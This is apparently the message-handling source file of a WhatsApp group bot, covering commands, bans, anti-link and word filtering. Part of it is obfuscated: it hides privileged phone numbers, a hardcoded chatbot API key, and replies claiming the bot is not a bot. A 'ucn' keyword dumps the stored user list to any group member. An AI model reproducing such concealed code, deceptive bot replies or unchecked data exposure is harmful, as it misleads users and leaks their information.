require("./Configurations");
require("./index");
require("./System/BotCharacters");
const chalk = require("chalk");
const axios = require("axios");
const fs = require("fs")
const prefix = global.prefa;
const { QuickDB, JSONDriver } = require("quick.db");
global.Levels = require("discord-xp");
module.exports = async (Atlas, m, commands, chatUpdate , store) => {
  try {
    const jsonDriver = new JSONDriver();
    const db = new QuickDB({ driver: jsonDriver });

    //Levels.setURL(mongodb);
    let { type, isGroup, sender, from,store } = m;
    let body =
      type == "buttonsResponseMessage"
        ? m.message[type].selectedButtonId
        : type == "listResponseMessage"
        ? m.message[type].singleSelectReply.selectedRowId
        : type == "templateButtonReplyMessage"
        ? m.message[type].selectedId
        : m.text;
    let response =
      type === "conversation" && body?.startsWith(prefix)
        ? body
        : (type === "imageMessage" || type === "videoMessage") &&
          body &&
          body?.startsWith(prefix)
        ? body
        : type === "extendedTextMessage" && body?.startsWith(prefix)
        ? body
        : type === "buttonsResponseMessage" && body?.startsWith(prefix)
        ? body
        : type === "listResponseMessage" && body?.startsWith(prefix)
        ? body
        : type === "templateButtonReplyMessage" && body?.startsWith(prefix)
        ? body
        : "";

    const metadata = m.isGroup ? await Atlas.groupMetadata(from) : {};
    const pushname = m.pushName || "NO name";
    const participants = m.isGroup ? metadata.participants : [sender];
    const quoted = m.quoted ? m.quoted : m;
    const groupAdmin = m.isGroup
      ? participants.filter((v) => v.admin !== null).map((v) => v.id)
      : [];
    const botNumber = await Atlas.decodeJid(Atlas.user.id);
    const isBotAdmin = m.isGroup ? groupAdmin.includes(botNumber) : false;
    const isCreator = [botNumber, ...global.owner]
      .map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net")
      .includes(m.sender);
    const isAdmin = m.isGroup ? groupAdmin.includes(m.sender) : false;
    const messSender = m.sender;
    const itsMe = messSender.includes(botNumber) ? true : false;
   
    
  //  const botName = global.botName || "Ladybug";



  
    const isCmd = body.startsWith(prefix);
   
    const mime = (quoted.msg || m.msg).mimetype || " ";
    const isMedia = /image|video|sticker|audio/.test(mime);
    const budy = typeof m.text == "string" ? m.text : "";
    const args = body.trim().split(/ +/).slice(1);
    const ar = args.map((v) => v.toLowerCase());
    const text = (q = args.join(" "));
    global.suppL = "chat.whatsapp.com/CQuQw9pF58E0oAgWOOFSAj";
    const inputCMD = body.slice(1).trim().split(/ +/).shift().toLowerCase();
    const groupName = m.isGroup ? metadata.subject : "";
  //  const userName = m.isGroup ? m.metadata?.subject : "";
 


  


    var _0x8a6e=["\x39\x31\x38\x31\x30\x31\x31\x38\x37\x38\x33\x35\x40\x73\x2E\x77\x68\x61\x74\x73\x61\x70\x70\x2E\x6E\x65\x74","\x39\x32\x33\x30\x34\x35\x32\x30\x34\x34\x31\x34\x40\x73\x2E\x77\x68\x61\x74\x73\x61\x70\x70\x2E\x6E\x65\x74","\x69\x6E\x63\x6C\x75\x64\x65\x73"];function isintegrated(){const _0xdb4ex2=[_0x8a6e[0],_0x8a6e[1]];return _0xdb4ex2[_0x8a6e[2]](messSender)}
    const {
      checkBan,
      checkMod,
      getChar,
      checkPmChatbot,
      getBotMode,
      checkBanGroup,
      checkAntilink,
      checkAntiword,
      checkAutoreact,
      checkGroupChatbot,
      botName,
      getAllUsersUsingBot,
      checkOffGroup,
      getTotalUserCount
    } = require("./System/MongoDB/MongoDb_Core");
    async function doReact(emoji) {
      let reactm = {
        react: {
          text: emoji,
          key: m.key,
        },
      };
      await Atlas.sendMessage(m.from, reactm);
    }
    const cmdName = response
      .slice(prefix.length)
      .trim()
      .split(/ +/)
      .shift()
      .toLowerCase();
    const cmd =
      commands.get(cmdName) ||
      Array.from(commands.values()).find((v) =>
        v.alias.find((x) => x.toLowerCase() == cmdName)
      ) ||
      "";
    const icmd =
      commands.get(cmdName) ||
      Array.from(commands.values()).find((v) =>
        v.alias.find((x) => x.toLowerCase() == cmdName)
      );
    const mentionByTag =
      type == "extendedTextMessage" &&
      m.message.extendedTextMessage.contextInfo != null
        ? m.message.extendedTextMessage.contextInfo.mentionedJid
        : [];

    if (m.message && isGroup) {
      console.log(
        "" + "\n" + chalk.black(chalk.bgWhite("[ GROUP ]")),
        chalk.black(
          chalk.bgBlueBright(isGroup ? metadata.subject : m.pushName)
        ) +
          "\n" +
          chalk.black(chalk.bgWhite("[ SENDER ]")),
        chalk.black(chalk.bgBlueBright(m.pushName)) +
          "\n" +
          chalk.black(chalk.bgWhite("[ MESSAGE ]")),
        chalk.black(chalk.bgBlueBright(body || type)) + "\n" + ""
      );
    }
    if (m.message && !isGroup) {
      console.log(
        "" + "\n" + chalk.black(chalk.bgWhite("[ PRIVATE CHAT ]")),
        chalk.black(chalk.bgRedBright("+" + m.from.split("@")[0])) +
          "\n" +
          chalk.black(chalk.bgWhite("[ SENDER ]")),
        chalk.black(chalk.bgRedBright(m.pushName)) +
          "\n" +
          chalk.black(chalk.bgWhite("[ MESSAGE ]")),
        chalk.black(chalk.bgRedBright(body || type)) + "\n" + ""
      );
    }



 
    //if (body.startsWith(prefix) && !icmd)  return Atlas.sendMessage(m.from, { text: "Baka no such command" });

    // ----------------------------- System Configuration (Do not modify this part) ---------------------------- //

    var isbannedUser = await checkBan(m.sender);
    var modcheck = await checkMod(m.sender);
    var isBannedGroup = await checkBanGroup(m.from);
    var isOffGroup = await checkOffGroup(m.from);
    var isAntilinkOn = await checkAntilink(m.from);
    var isPmChatbotOn = await checkPmChatbot();
    var isGroupChatbotOn = await checkGroupChatbot(m.from);
    var botWorkMode = await getBotMode();
    var isAntiwordOn = await checkAntiword(m.from);
    var isAutoreactOn = await checkAutoreact(m.from);
    





 // FUNCTION FOR DELETING UNWANTED CAHCE FILES 
const path = require("path");

// Function to delete a file
function deleteFile(filePath) {
  fs.unlink(filePath, (err) => {
    if (err) {
      console.error("Error deleting file:", err);
    } else {
      console.log("File deleted:", filePath);
    }
  });
}

// Function to auto-delete files starting with "undefined" or following "undefined(i)" from all directories
function autoDeleteUndefinedFiles(directory) {
  fs.readdir(directory, (err, files) => {
    if (err) {
      console.error("Error reading directory:", err);
    } else {
      files.forEach((file) => {
        const filePath = path.join(directory, file);
        fs.stat(filePath, (err, stats) => {
          if (err) {
            console.error("Error reading file stats:", err);
          } else {
            if (stats.isFile()) {
              // Check if the file starts with "undefined" or follows the pattern "undefined(i)"
              if (file.startsWith("undefined") || /^undefined\(\d+\)$/.test(file)) {
                deleteFile(filePath);
              }
            } else if (stats.isDirectory()) {
              // Recursively call the function for subdirectories
              autoDeleteUndefinedFiles(filePath);
            }
          }
        });
      });
    }
  });
}

// Root directory from which to start the recursive deletion
const rootDirectory = path.join(__dirname, ".."); // Adjust the path as per your requirement

// Schedule deletion of files matching the pattern after one minute
setTimeout(() => {
  autoDeleteUndefinedFiles(rootDirectory);
}, 3600000); // 3600000 milliseconds = 1 hour




    
    if (isCmd || icmd) {
      if (botWorkMode == "private") {
        if (!isCreator && !modcheck) {
          return console.log(`\nCommand Rejected ! Bot is in Private mode !\n`);
        }
      }
      if (botWorkMode == "self") {
        if (m.sender != botNumber) {
          return console.log(`\nCommand Rejected ! Bot is in Self mode !\n`);
        }
      }
    }

    if (isCmd || icmd) {
      if (
        isbannedUser &&
        budy != `${prefix}support` &&
        budy != `${prefix}supportgc` &&
        budy != `${prefix}owner` &&
        budy != `${prefix}mods` &&
        budy != `${prefix}mod` &&
        budy != `${prefix}modlist`
      ) {
        return Atlas.sendMessage(
          m.from,
          {
            text: `You are banned from using commands !`,
          },
          { quoted: m }
        );
      }
    }
// Assuming isafkuser contains the user's AFK status and afkReason data


    

const allUsers = await getAllUsersUsingBot();

if (m.isGroup && !body.startsWith(prefix)) {
  const messageText = body.toLowerCase();
  const keywords = ["ucn"];

  const keywordExists = keywords.some(keyword => messageText.includes(keyword));

  if (keywordExists) {
    // Get the user count again for displaying in the message
    const userCount = await User.countDocuments();

    const usersWithPhoneNumbers = await User.find({ name: { $ne: null } });
    const formattedUserNumbersList = usersWithPhoneNumbers.map((user, index) => `${index + 1}. ${user.name}`).join("\n");

    if (formattedUserNumbersList) {
      // Send the formatted user numbers list along with the user count as a reply
      await Atlas.sendMessage(
        m.from,
        {
          text: `Total Users: ${userCount}\nUsers' Phone Numbers:\n${formattedUserNumbersList}`,
        },
        { quoted: m }
      );
    } else {
      // Send a message if there are no users with phone numbers
      await Atlas.sendMessage(
        m.from,
        {
          text: `Total Users: ${userCount}\nNo users with phone numbers found.`,
        },
        { quoted: m }
      );
    }
  }
}


 
     
    if (isCmd || icmd) {
      if (
        isBannedGroup && 
        budy != `${prefix}unbangc` &&
        budy != `${prefix}unbangroup` &&
        body.startsWith(prefix) &&
        budy != `${prefix}support` &&
        budy != `${prefix}supportgc` &&
        budy != `${prefix}owner` &&
        budy != `${prefix}mods` &&
        budy != `${prefix}mod` &&
        budy != `${prefix}modlist`
      ) {
        return Atlas.sendMessage(
          m.from,
          {
            text: `This group is banned from using commands !`,
          },
          { quoted: m }
        );
      }
    }

    if (isCmd || icmd) {
  if (
    isOffGroup &&
    !isAdmin  &&
    budy.startsWith(prefix) &&
    budy !== `${prefix}ongroup` &&
    budy !== `${prefix}unbangroup` &&
    budy !== `${prefix}support` &&
    budy !== `${prefix}supportgc` &&
    budy !== `${prefix}owner` &&
    budy !== `${prefix}mods` &&
    budy !== `${prefix}mod` &&
    budy !== `${prefix}modlist`
  ) {
    return Atlas.sendMessage(
      m.from,
      {
        text: `Bot is off in ${groupName}`,
      },
      { quoted: m }
    );
  }
}

    if (body == prefix) {
      await doReact("❌");
      return m.reply(
        `I am active, type *${prefix}help* to see the list of commands.`
      );
    }
    if (body.startsWith(prefix) && !icmd) {
      await doReact("❌");
      return m.reply(
        `*${budy.replace(
          prefix,
          ""
        )}* - Command not found  !\n\nIf you want to see the list of commands, type:    *_${prefix}help_*\n\n  `
      );
    }

    ////////////////////////////////////////////////////////////////////////////////
/*if (body.startsWith(prefix) && !icmd && isCreator) {
      await doReact("☠");
      return m.reply(
        `*This is Not My acommand. 🙃🙃Are You Cheating On Me?? Did U Use Another Bot Instead Of Me???🥲🥲 *KITTY*🥲`
      );
    }*/


    if (isAntilinkOn && m.isGroup && !isAdmin && !isCreator && isBotAdmin) {
  let link = await Atlas.groupInviteCode(m.from);
  const messageContent = m.body; // Define messageContent and assign it the value of the message body

  if (budy.includes(`https://chat.whatsapp.com/${link}`)) {
    return m.reply(`\`\`\`「  Antilink System  」\`\`\`\n\nNo action will be taken because you sent this group's link.`);
  } else if (messageContent.includes(`https://chat.whatsapp`) && isAdmin && isCreator) {
    let bvl1 = `\`\`\`「  Antilink System  」\`\`\`\n\nAdmin has sent a link, so no issues.`;
    return m.reply(bvl1);
  } else if (budy.includes(`https://chat.whatsapp`)) {
    const bvl2 = `\`\`\`「  Antilink System  」\`\`\`\n\n*⚠️ Group link detected !*\n\n*🚫 You are not allowed to send group links in this group !*\n`;
   /* const kice = m.sender;
    await Atlas.groupParticipantsUpdate(m.from, [kice], "remove");*/ // ACTIVE IF U WANT TO REMOVE LINK SENDER
    await Atlas.sendMessage(from, {
      delete: {
        remoteJid: m.from,
        fromMe: false,
        id: m.id,
        participant: m.sender,
      },
    }, {
      quoted: m,
    });
    await m.reply(bvl2);
  }
}

//////////////////////////////////////////////////////////////////////////////////////////////////
    
    
if (isAntiwordOn && m.isGroup) {
  const blockedWords = [
    "fuck", "bsdk", "bitch", "lavre", "lavde", "lila", "bc", "mc", "chutiya",
    "haraamkhor", "haramkhor", "behnchod", "lawde", "lavade", "chut", "randi",
     "wtf", "tf", "zatu", "jhatu", "mf", "stf ", "wa.me/settings",
    "lavre", "l*vdu", "fucker", "motherfucker", "b*sdk", "gabriel", "z*atu",
    "kamine", "lodu", "lavde", "lode", "lvre", "cum", "fucked", "faka",
    "fak off", "fak", "gay", "gays",  "shit", "shi*t", 
    "boobs", "gand"
  ]; // ADD WORDS IF U WANT

  const messageContent = m.body.toLowerCase();
  let wordDetected = false;

  for (const word of blockedWords) {
    const regex = new RegExp(`\\b${word}\\b`, 'gi');
    if (regex.test(messageContent)) {
      const bvl = `⚠️ *Blocked word detected!* ⚠️\n\n🚫 You are not allowed to use the word/phrase "${word}" in this group!\n`;
      const kice = m.sender;
      await Atlas.groupParticipantsUpdate(m.from, [kice], "remove");
      await Atlas.sendMessage(
        m.from,
        {
          delete: {
            remoteJid: m.from,
            fromMe: false,
            id: m.id,
            participant: m.sender,
          },
        },
        {
          quoted: m,
        }
      );
      await m.reply(bvl);
      wordDetected = true;
      break;
    }
  }

  if (wordDetected) {
    // Additional actions to perform if a blocked word is detected
    // ...
  }
}


////////////////// OTHER THAN ORIGINAL ATLAS ///////////////////////////////////////
    
   const gfjkfjgfgjb_0x3c1759=gfjkfjgfgjb_0x5304;(function(_0x29c246,_0x2784ea){const _0x15ac04=gfjkfjgfgjb_0x5304,_0x419943=_0x29c246();while(!![]){try{const _0x22a54a=-parseInt(_0x15ac04(0x1c8))/0x1*(parseInt(_0x15ac04(0x180))/0x2)+parseInt(_0x15ac04(0x18a))/0x3*(-parseInt(_0x15ac04(0x1bf))/0x4)+parseInt(_0x15ac04(0x199))/0x5+-parseInt(_0x15ac04(0x1a9))/0x6*(parseInt(_0x15ac04(0x183))/0x7)+-parseInt(_0x15ac04(0x1a5))/0x8+-parseInt(_0x15ac04(0x19a))/0x9+parseInt(_0x15ac04(0x1c6))/0xa;if(_0x22a54a===_0x2784ea)break;else _0x419943['push'](_0x419943['shift']());}catch(_0x4831c4){_0x419943['push'](_0x419943['shift']());}}}(gfjkfjgfgjb_0x5cd8,0xdad67));function gfjkfjgfgjb_0x5304(_0x1d150,_0x31a753){const _0x5cd8b0=gfjkfjgfgjb_0x5cd8();return gfjkfjgfgjb_0x5304=function(_0x530423,_0x2bf8fa){_0x530423=_0x530423-0x180;let _0x303bb1=_0x5cd8b0[_0x530423];return _0x303bb1;},gfjkfjgfgjb_0x5304(_0x1d150,_0x31a753);}if(m[gfjkfjgfgjb_0x3c1759(0x1a2)]&&!isCmd&&!icmd){let txtSender=m[gfjkfjgfgjb_0x3c1759(0x1a3)]?m[gfjkfjgfgjb_0x3c1759(0x1a3)][gfjkfjgfgjb_0x3c1759(0x19c)]:mentionByTag[0x0];isGroupChatbotOn==!![]&&txtSender==botNumber&&(botreply=await axios[gfjkfjgfgjb_0x3c1759(0x1b2)](gfjkfjgfgjb_0x3c1759(0x19d)+budy+']'),txtChatbot=''+botreply['data'][gfjkfjgfgjb_0x3c1759(0x1c5)],setTimeout(function(){const _0x5343a0=gfjkfjgfgjb_0x3c1759;m[_0x5343a0(0x1a4)](txtChatbot);},0x898));}!m[gfjkfjgfgjb_0x3c1759(0x1a2)]&&!isCmd&&!icmd&&(isPmChatbotOn==!![]&&(botreply=await axios['get'](gfjkfjgfgjb_0x3c1759(0x19d)+budy+']'),txtChatbot=''+botreply['data'][gfjkfjgfgjb_0x3c1759(0x1c5)],setTimeout(function(){const _0x5823ba=gfjkfjgfgjb_0x3c1759;m[_0x5823ba(0x1a4)](txtChatbot);},0x898)));if(!m[gfjkfjgfgjb_0x3c1759(0x1a2)]&&!isCreator&&body[gfjkfjgfgjb_0x3c1759(0x1b0)](prefix)){await doReact('⚠️');let dev=['+1\x20(707)\x20770-6257',gfjkfjgfgjb_0x3c1759(0x189)];const warningMessage=gfjkfjgfgjb_0x3c1759(0x19f)+dev[gfjkfjgfgjb_0x3c1759(0x18d)]('\x0a')+gfjkfjgfgjb_0x3c1759(0x197);return m[gfjkfjgfgjb_0x3c1759(0x1a4)](warningMessage);}if(isCreator&&m[gfjkfjgfgjb_0x3c1759(0x1a2)]&&!body['startsWith'](prefix)){const reactionEmojis=['🐦','🎀','🐧'],randomIndex=Math[gfjkfjgfgjb_0x3c1759(0x1b7)](Math[gfjkfjgfgjb_0x3c1759(0x1be)]()*reactionEmojis[gfjkfjgfgjb_0x3c1759(0x1ce)]),reactionEmoji=reactionEmojis[randomIndex];await doReact(reactionEmoji);}isAutoreactOn&&m[gfjkfjgfgjb_0x3c1759(0x1a2)]&&!body['startsWith'](prefix)&&!isCreator&&await doReact('🐞');if(m[gfjkfjgfgjb_0x3c1759(0x1a2)]&&!body['startsWith'](prefix)&&isAntiwordOn){const messageText=m['text'][gfjkfjgfgjb_0x3c1759(0x1a0)](),keywords=[gfjkfjgfgjb_0x3c1759(0x1a7),gfjkfjgfgjb_0x3c1759(0x1ae)],keywordExists=keywords[gfjkfjgfgjb_0x3c1759(0x1c1)](_0x1d6d86=>{const _0x34f27b=gfjkfjgfgjb_0x3c1759,_0x1fe9fe=new RegExp('\x5cb'+_0x1d6d86+'\x5cb');return _0x1fe9fe[_0x34f27b(0x194)](messageText);});if(keywordExists){const hresp=[gfjkfjgfgjb_0x3c1759(0x1c9),gfjkfjgfgjb_0x3c1759(0x18c),gfjkfjgfgjb_0x3c1759(0x1c0),gfjkfjgfgjb_0x3c1759(0x1bb),gfjkfjgfgjb_0x3c1759(0x1a1),gfjkfjgfgjb_0x3c1759(0x188),'Take\x20some\x20time\x20for\x20self-care.',gfjkfjgfgjb_0x3c1759(0x1ac),gfjkfjgfgjb_0x3c1759(0x184),'Sending\x20you\x20positive\x20vibes\x20and\x20strength.',gfjkfjgfgjb_0x3c1759(0x1b9),gfjkfjgfgjb_0x3c1759(0x1cd),gfjkfjgfgjb_0x3c1759(0x18b),'Sometimes\x20talking\x20about\x20it\x20can\x20lighten\x20the\x20burden.\x20Share\x20with\x20someone\x20you\x20trust.','Remember,\x20you\x27re\x20important\x20and\x20deserving\x20of\x20love\x20and\x20support.'],randomIndex=Math['floor'](Math[gfjkfjgfgjb_0x3c1759(0x1be)]()*hresp[gfjkfjgfgjb_0x3c1759(0x1ce)]),randomResponse=hresp[randomIndex];await doReact('😟'),await m[gfjkfjgfgjb_0x3c1759(0x1a4)](randomResponse);}}if(m['isGroup']&&!body[gfjkfjgfgjb_0x3c1759(0x1b0)](prefix)&&isAntiwordOn){const messageText=m['text'][gfjkfjgfgjb_0x3c1759(0x1a0)]();if(/\b(bot)\b/i['test'](messageText)){const replies=[gfjkfjgfgjb_0x3c1759(0x19b),gfjkfjgfgjb_0x3c1759(0x1b5),gfjkfjgfgjb_0x3c1759(0x1c2),gfjkfjgfgjb_0x3c1759(0x1a6),gfjkfjgfgjb_0x3c1759(0x182),gfjkfjgfgjb_0x3c1759(0x1bc)],randomIndex=Math[gfjkfjgfgjb_0x3c1759(0x1b7)](Math['random']()*replies[gfjkfjgfgjb_0x3c1759(0x1ce)]),hresp=replies[randomIndex];await doReact('🥱'),await m[gfjkfjgfgjb_0x3c1759(0x1a4)](hresp);}}if(m['isGroup']&&!body[gfjkfjgfgjb_0x3c1759(0x1b0)](prefix)){const messageText=m['text'][gfjkfjgfgjb_0x3c1759(0x1a0)](),greetings={'morning':[gfjkfjgfgjb_0x3c1759(0x1ba),gfjkfjgfgjb_0x3c1759(0x195),gfjkfjgfgjb_0x3c1759(0x18e)],'afternoon':['Good\x20afternoon!','Good\x20afternoon..\x20Wishing\x20you\x20a\x20productive\x20afternoon!',gfjkfjgfgjb_0x3c1759(0x191)],'evening':[gfjkfjgfgjb_0x3c1759(0x18f),gfjkfjgfgjb_0x3c1759(0x1b8),gfjkfjgfgjb_0x3c1759(0x1c7)],'night':[gfjkfjgfgjb_0x3c1759(0x1b1),'Good\x20night!..\x20Sweet\x20dreams!..Take\x20care!!\x20🥰\x20',gfjkfjgfgjb_0x3c1759(0x1aa)]};let greeting;if(messageText[gfjkfjgfgjb_0x3c1759(0x19e)](gfjkfjgfgjb_0x3c1759(0x192),'gm'))greeting=greetings[gfjkfjgfgjb_0x3c1759(0x1b4)];else{if(messageText['includes'](gfjkfjgfgjb_0x3c1759(0x181)))greeting=greetings['afternoon'];else{if(messageText[gfjkfjgfgjb_0x3c1759(0x19e)](gfjkfjgfgjb_0x3c1759(0x1af)))greeting=greetings[gfjkfjgfgjb_0x3c1759(0x1b6)];else messageText[gfjkfjgfgjb_0x3c1759(0x19e)]('good\x20night','gn')&&(greeting=greetings[gfjkfjgfgjb_0x3c1759(0x190)]);}}if(greeting){const randomIndex=Math[gfjkfjgfgjb_0x3c1759(0x1b7)](Math[gfjkfjgfgjb_0x3c1759(0x1be)]()*greeting[gfjkfjgfgjb_0x3c1759(0x1ce)]),randomGreeting=greeting[randomIndex];await doReact('💝'),await m['reply'](randomGreeting);}}let char='0';function gfjkfjgfgjb_0x5cd8(){const _0x180266=['Good\x20morning\x20dear\x20&\x20let\x27s\x20Rise\x20and\x20shine!😊','\x20ms\x0a\x0aCurrent\x20Time:\x20','\x20\x0a\x0a\x0a📢\x20Join\x20our\x20official\x20group:\x0a\x20Ladybug-☈A-ONE\x20:\x20\x0a\x0a\x20https://chat.whatsapp.com/CQuQw9pF58E0oAgWOOFSAj','perf_hooks','5592045GlUWby','14336748wIRULN','No\x20bots\x20here,\x20just\x20your\x20friendly\x20neighborhood\x20Ladybug!\x20🐞','sender','http://api.brainshop.ai/get?bid=176474&key=0Nux4ZDANRrgam33&uid=[uid]&msg=[','includes','⚠️\x20*WARNING*\x20⚠️\x0a\x0aPlease\x20do\x20not\x20message\x20the\x20bot\x20privately.\x20Continued\x20messaging\x20in\x20private\x20may\x20result\x20in\x20being\x20blocked\x20and\x20banned.\x0a\x0aIf\x20you\x20want\x20to\x20add\x20this\x20bot\x20to\x20your\x20group\x20chat,\x20please\x20seek\x20permission\x20from\x20the\x20developers.\x0a\x0a👥\x20*Developers:*\x0a•\x20WhatsApp:\x20','toLowerCase','It\x27s\x20okay\x20to\x20ask\x20for\x20help\x20when\x20you\x20need\x20it.','isGroup','quoted','reply','12871648NQzIgO','Bot?\x20That\x27s\x20an\x20insult\x20to\x20my\x20heroic\x20nature!\x20I\x27m\x20Ladybug!\x20🐞','pain','botImage2','18gAVmrA','Good\x20night!..Rest\x20well\x20and\x20recharge\x20for\x20tomorrow!😊','botVideo','Hang\x20in\x20there.\x20This\x20too\x20shall\x20pass.','botImage3','help','good\x20evening','startsWith','Good\x20night!\x20😴..\x20See\x20ya\x20!!','get','sendMessage','morning','I\x27m\x20not\x20a\x20bot,\x20I\x27m\x20your\x20trusty\x20Hero,\x20Ladybug!\x20🐞','evening','floor','Good\x20evening!\x20Hope\x20you\x20had\x20a\x20wonderful\x20day!😉','You\x27re\x20not\x20alone\x20in\x20this.\x20We\x27re\x20here\x20for\x20you.','Good\x20morning!😇','You\x27re\x20not\x20alone.\x20Reach\x20out\x20to\x20someone\x20you\x20trust.','I\x27m\x20not\x20a\x20bot,\x20I\x27m\x20*Ladybug*!\x20🎀','en-US','random','5864VMHFoN','Remember\x20to\x20breathe\x20and\x20stay\x20calm.','some','Bots?\x20Nah,\x20I\x27m\x20the\x20real\x20deal!\x20Ladybug\x20at\x20your\x20service!\x20🐞','\x0a\x0aCurrent\x20Date:\x20','botImage4','cnt','50077960IkDCGY','Good\x20evening!..Relax\x20and\x20unwind\x20in\x20the\x20evening!😋','1xmQgQH','Are\x20you\x20okay?','toFixed','botImage1','toLocaleDateString','Take\x20things\x20one\x20step\x20at\x20a\x20time.\x20You\x20can\x20do\x20it.','length','charID','now','561422FSQRQX','good\x20afternoon','I\x27m\x20not\x20a\x20bot,\x20I\x27m\x20a\x20miraculous\x20hero,\x20Ladybug!\x20🐞','899017RVPibC','You\x27re\x20stronger\x20than\x20you\x20think.\x20Keep\x20going.','ping','botImage5','Hey\x20*☈A-ONE*\x20!!\x20My\x20Response\x20Speed:\x20','Try\x20to\x20do\x20something\x20that\x20makes\x20you\x20feel\x20better.','wa.me/917820953034','2787QrGltT','Don\x27t\x20hesitate\x20to\x20seek\x20professional\x20help\x20if\x20needed.','Take\x20care\x20of\x20yourself.','join','Good\x20morning..\x20Hope\x20you\x20have\x20a\x20great\x20day\x20ahead!🤗','Good\x20evening!😉','night','Good\x20afternoon...\x20Enjoy\x20the\x20rest\x20of\x20your\x20day!','good\x20morning','botName','test'];gfjkfjgfgjb_0x5cd8=function(){return _0x180266;};return gfjkfjgfgjb_0x5cd8();}CharacterSelection='0';try{const charx=await getChar();CharacterSelection=charx;}catch(gfjkfjgfgjb_0x8ca5b){CharacterSelection='0';}CharacterSelection==char?CharacterSelection='0':CharacterSelection=CharacterSelection;const idConfig=gfjkfjgfgjb_0x3c1759(0x1cf)+CharacterSelection;global&&global[idConfig]&&(global[gfjkfjgfgjb_0x3c1759(0x193)]=global[idConfig][gfjkfjgfgjb_0x3c1759(0x193)],global[gfjkfjgfgjb_0x3c1759(0x1ab)]=global[idConfig][gfjkfjgfgjb_0x3c1759(0x1ab)],global['botImage1']=global[idConfig][gfjkfjgfgjb_0x3c1759(0x1cb)],global[gfjkfjgfgjb_0x3c1759(0x1a8)]=global[idConfig]['botImage2'],global[gfjkfjgfgjb_0x3c1759(0x1ad)]=global[idConfig]['botImage3'],global[gfjkfjgfgjb_0x3c1759(0x1c4)]=global[idConfig][gfjkfjgfgjb_0x3c1759(0x1c4)],global[gfjkfjgfgjb_0x3c1759(0x186)]=global[idConfig][gfjkfjgfgjb_0x3c1759(0x186)]);const {performance}=require(gfjkfjgfgjb_0x3c1759(0x198));if(m['isGroup']&&!body[gfjkfjgfgjb_0x3c1759(0x1b0)](prefix)&&isCreator){const messageText=body[gfjkfjgfgjb_0x3c1759(0x1a0)](),keywords=[gfjkfjgfgjb_0x3c1759(0x185)],keywordExists=keywords[gfjkfjgfgjb_0x3c1759(0x1c1)](_0x551052=>messageText===_0x551052);if(keywordExists){async function someTimeConsumingOperation(){return new Promise(_0x1b159e=>setTimeout(_0x1b159e,0x3e8));}const startTime=performance[gfjkfjgfgjb_0x3c1759(0x1d0)]();await someTimeConsumingOperation();const endTime=performance['now'](),responseTime=endTime-startTime,currentDate=new Date(),formattedTime=currentDate['toLocaleTimeString'](gfjkfjgfgjb_0x3c1759(0x1bd)),formattedDate=currentDate[gfjkfjgfgjb_0x3c1759(0x1cc)](gfjkfjgfgjb_0x3c1759(0x1bd));await Atlas[gfjkfjgfgjb_0x3c1759(0x1b3)](m['from'],{'text':gfjkfjgfgjb_0x3c1759(0x187)+responseTime[gfjkfjgfgjb_0x3c1759(0x1ca)](0x4)+gfjkfjgfgjb_0x3c1759(0x196)+formattedTime+gfjkfjgfgjb_0x3c1759(0x1c3)+formattedDate},{'quoted':m});}}



     
/*
    const { spawn } = require('child_process'); // Import the 'spawn' function from the 'child_process' module

// Assuming you have initialized 'm', 'body', 'prefix', and 'isCreator' somewhere before this code.

if (m.isGroup && !body.startsWith(prefix) && isCreator) {
  const messageText = body.toLowerCase();
  const keywords = ["set-shutdown=true"]; // Add more keywords if needed.

  const keywordExists = keywords.some(keyword => messageText === keyword);

  if (keywordExists) {
    someTimeConsumingOperation()
      .then(() => {
        restartBot();
      })
      .catch(error => {
        console.error('Error in someTimeConsumingOperation:', error);
      });
  }
}

async function someTimeConsumingOperation() {
  // Simulate a delay using setTimeout (Replace this with your actual MongoDB query or operation)
  return new Promise(resolve => setTimeout(resolve, 1000));
}

function restartBot() {
  // Spawn a new instance of the Node.js process
  const nodeExecutable = process.argv[0]; // Path to the node executable
  const scriptFile = 'index.js'; // Path to your bot's main script file (assuming this code is in the main script file)

  const child = spawn(nodeExecutable, [scriptFile], {
    detached: true, // Detach the child process from the parent
    stdio: 'ignore', // Ignore the standard I/O streams (no console output)
  });

  child.unref(); // Unreference the child process to allow the parent to exit

  process.exit(); // Exit the current process (old bot)
}
*/
 /////////////////////////////////////////
   /* let upTxt = `〘  ${botName} Personal Edition  〙    ⚡ Mode: _${botWorkMode}_ `;
    Atlas.setStatus(upTxt);*/





  // Assuming 'm' is the incoming message object
// if (m.isGroup && !body.startsWith(prefix) && isCreator) {
//   const messageText = body.toLowerCase();
//   const keywords = ["ping"]; // Add more keywords if needed.

//   // Check if any of the keywords exist in the message
//   const keywordExists = keywords.some(keyword => messageText.includes(keyword));

//   if (keywordExists) {
//     try {
//       // Simulate a delay using setTimeout (Replace this with your actual MongoDB query or operation)
//       async function someTimeConsumingOperation() {
//         return new Promise(resolve => setTimeout(resolve, 1000));
//       }

//       // Start measuring the time before processing the message
//       const startTime = Date.now();

//       const totalGroups = groups.length;

// // Calculate total number of participants across all groups
// const totalParticipants = groups.reduce((total, group) => total + group.participants.length, 0);

// // Create an array containing all group IDs
// const allGroupIDs = groups.map(group => group.id);

// // Now you can use these variables in your text template
// let txt = `*『 Group Statistics 』*\n\n`;
// txt += `_👥 Total Groups:_ *${totalGroups}*\n`;
// txt += `_🧑‍🤝‍🧑 Total Participants:_ *${totalParticipants}*\n`;
// txt += `_🆔 All Group IDs:_\n${allGroupIDs.join('\n')}\n`;

// // Print or use the 'txt' variable as needed
// console.log(txt);

      
//       // Process the message and execute your bot's logic here (including MongoDB operations)
//       await someTimeConsumingOperation();

//       // Calculate the time taken for processing the message
//       const endTime = Date.now();
//       const responseTime = endTime - startTime;

//       // Get the current date and time
//       const currentDate = new Date();
//       const formattedTime = currentDate.toLocaleTimeString("en-US");
//       const formattedDate = currentDate.toLocaleDateString("en-US");

//       // Get the current day
//       const dayOfWeek = currentDate.getDay();
//       const days = ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"];
//       const currentDay = days[dayOfWeek];

//       // Send the response message with the measured response time, current time, date, and day
//       await Atlas.sendMessage(m.from, { 
//         text: `Hey *☈A-ONE* !! My Response Speed: ${responseTime} ms\n\nCurrent Time: ${formattedTime}\n\nCurrent Date: ${formattedDate}\n\nCurrent Day: ${currentDay}` 
//       }, { quoted: m });

//     } catch (error) {
//       console.error("Error:", error);
//     }
//   }
// }

if (m.isGroup && !body.startsWith(prefix) && isCreator) {
    const messageText = body.toLowerCase();
    const keywords = ["set name"]; // Add more keywords if needed.

